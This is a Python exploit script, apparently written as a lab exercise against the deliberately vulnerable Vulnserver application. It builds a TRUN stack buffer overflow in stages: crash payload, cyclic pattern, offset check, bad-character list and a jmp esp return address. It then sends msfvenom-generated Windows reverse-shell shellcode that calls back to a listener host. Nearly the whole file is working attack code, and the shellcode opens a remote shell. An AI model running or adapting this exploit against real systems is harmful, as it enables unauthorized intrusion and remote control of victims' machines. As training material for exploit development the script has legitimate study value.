#!/usr/bin/env python

from struct import pack
from socket import socket, AF_INET, SOCK_STREAM
from sys import exit

rhost = "192.168.41.128"
rport = 9999
target = (rhost, rport)
expected_payload_length = (
    len("TRUN /.:/") + len("\r\n") + 3000
)


def banner(rhost, rport):
    print("""==================================================================
Vulnserver TRUN Exploit
By: Kevin Kirsche (d3c3pt10n)
==================================================================
RHOST: {rhost} | RPORT: {rport}
        """.format(rhost=rhost, rport=rport))


def info(msg):
    print('[*] {msg}'.format(msg=msg))


def error(msg):
    print('[!] {msg}'.format(msg=msg))


def received(msg):
    print('[+] Received:\n\t{msg}'.format(msg=msg))


def poc_payload():
    payload = "TRUN /.:/"
    payload += "A"*3000
    payload += "\r\n"
    return payload


def pattern_payload():
    payload = "TRUN /.:/"
    payload += (
        "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2"
        "Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5"
        "Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8"
        "Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1"
        "Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4"
        "Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7"
        "An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0"
        "Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3"
        "As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6"
        "Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9"
        "Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2"
        "Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5"
        "Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8"
        "Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1"
        "Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4"
        "Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7"
        "Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0"
        "Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3"
        "Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6"
        "Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9"
        "Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2"
        "Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5"
        "By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8"
        "Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1"
        "Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4"
        "Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7"
        "Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0"
        "Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3"
        "Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6"
        "Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9"
        "Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2"
        "Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5"
        "Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8"
        "Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1"
        "Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4"
        "Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7"
        "De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0"
        "Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3"
        "Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6"
        "Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9"
        "Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2"
        "Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5"
        "Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8"
        "Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9")
    payload += "\r\n"
    return payload


def verify_payload():
    # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000
    # -q 386F4337
    # [*] Exact match at offset 2003
    payload = "TRUN /.:/"
    payload += "A" * 2003
    payload += "B" * 4
    payload += "C" * 993
    payload += "\r\n"
    return payload

def bad_chars_payload():
    bad_chars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
        "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31"
        "\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
        "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53"
        "\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64"
        "\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
        "\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86"
        "\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97"
        "\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
        "\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9"
        "\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca"
        "\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb"
        "\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec"
        "\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd"
        "\xfe\xff")
    payload = "TRUN /.:/"
    # Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll]
    # ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
    # (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\
    #                                                       essfunc.dll)
    payload += "A" * 2003
    payload += pack("<L", 0x625011AF)
    payload += bad_chars
    payload += "\xCC" * (993 - len(bad_chars))
    payload += "\r\n"
    return payload


def jmp_esp_payload():
    payload = "TRUN /.:/"
    # Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll]
    # ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
    # (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\
    #                                                       essfunc.dll)
    payload += "A" * 2003
    payload += pack("<L", 0x625011AF)
    payload += "\xCC" * 993
    payload += "\r\n"
    return payload


def shellcode_payload():
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.41.132 LPORT=4444
    # -b "\x00" -f py -v revshell -a x86 --platform windows
    # Payload size: 351 bytes
    revshell = ""
    revshell += "\xb8\x2a\x94\xfa\xc2\xdb\xd8\xd9\x74\x24\xf4\x5e"
    revshell += "\x29\xc9\xb1\x52\x83\xc6\x04\x31\x46\x0e\x03\x6c"
    revshell += "\x9a\x18\x37\x8c\x4a\x5e\xb8\x6c\x8b\x3f\x30\x89"
    revshell += "\xba\x7f\x26\xda\xed\x4f\x2c\x8e\x01\x3b\x60\x3a"
    revshell += "\x91\x49\xad\x4d\x12\xe7\x8b\x60\xa3\x54\xef\xe3"
    revshell += "\x27\xa7\x3c\xc3\x16\x68\x31\x02\x5e\x95\xb8\x56"
    revshell += "\x37\xd1\x6f\x46\x3c\xaf\xb3\xed\x0e\x21\xb4\x12"
    revshell += "\xc6\x40\x95\x85\x5c\x1b\x35\x24\xb0\x17\x7c\x3e"
    revshell += "\xd5\x12\x36\xb5\x2d\xe8\xc9\x1f\x7c\x11\x65\x5e"
    revshell += "\xb0\xe0\x77\xa7\x77\x1b\x02\xd1\x8b\xa6\x15\x26"
    revshell += "\xf1\x7c\x93\xbc\x51\xf6\x03\x18\x63\xdb\xd2\xeb"
    revshell += "\x6f\x90\x91\xb3\x73\x27\x75\xc8\x88\xac\x78\x1e"
    revshell += "\x19\xf6\x5e\xba\x41\xac\xff\x9b\x2f\x03\xff\xfb"
    revshell += "\x8f\xfc\xa5\x70\x3d\xe8\xd7\xdb\x2a\xdd\xd5\xe3"
    revshell += "\xaa\x49\x6d\x90\x98\xd6\xc5\x3e\x91\x9f\xc3\xb9"
    revshell += "\xd6\xb5\xb4\x55\x29\x36\xc5\x7c\xee\x62\x95\x16"
    revshell += "\xc7\x0a\x7e\xe6\xe8\xde\xd1\xb6\x46\xb1\x91\x66"
    revshell += "\x27\x61\x7a\x6c\xa8\x5e\x9a\x8f\x62\xf7\x31\x6a"
    revshell += "\xe5\x38\x6d\x5d\x71\xd0\x6c\x9d\x68\x7d\xf8\x7b"
    revshell += "\xe0\x6d\xac\xd4\x9d\x14\xf5\xae\x3c\xd8\x23\xcb"
    revshell += "\x7f\x52\xc0\x2c\x31\x93\xad\x3e\xa6\x53\xf8\x1c"
    revshell += "\x61\x6b\xd6\x08\xed\xfe\xbd\xc8\x78\xe3\x69\x9f"
    revshell += "\x2d\xd5\x63\x75\xc0\x4c\xda\x6b\x19\x08\x25\x2f"
    revshell += "\xc6\xe9\xa8\xae\x8b\x56\x8f\xa0\x55\x56\x8b\x94"
    revshell += "\x09\x01\x45\x42\xec\xfb\x27\x3c\xa6\x50\xee\xa8"
    revshell += "\x3f\x9b\x31\xae\x3f\xf6\xc7\x4e\xf1\xaf\x91\x71"
    revshell += "\x3e\x38\x16\x0a\x22\xd8\xd9\xc1\xe6\xe8\x93\x4b"
    revshell += "\x4e\x61\x7a\x1e\xd2\xec\x7d\xf5\x11\x09\xfe\xff"
    revshell += "\xe9\xee\x1e\x8a\xec\xab\x98\x67\x9d\xa4\x4c\x87"
    revshell += "\x32\xc4\x44"

    payload = "TRUN /.:/"
    # Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll]
    # ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
    # (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\
    #                                                       essfunc.dll)
    payload += "A" * 2003
    payload += pack("<L", 0x625011AF)
    # Message=!!! Hooray, normal shellcode unmodified !!!
    payload += '\x90' * 20
    payload += revshell
    payload += "\xCC" * (993 - 20 - len(revshell))
    payload += "\r\n"
    return payload


if __name__ == '__main__':
    banner(rhost, rport)
    payload = shellcode_payload()
    if len(payload) != expected_payload_length:
        error('Payload length was {curr_len}, expected: {exp_len}'.format(
            curr_len=len(payload), exp_len=expected_payload_length))
        exit(1)

    s = socket(AF_INET, SOCK_STREAM)
    info('Connecting to target')
    try:
        s.connect(target)
    except Exception:
        error('Failed to connect to target!')
        exit(1)

    try:
        welcome = s.recv(1024)
        received(welcome)
    except Exception:
        error('Failed to receive welcome message from vulnserver!')
        exit(1)

    info('Sending payload')
    s.send(payload)
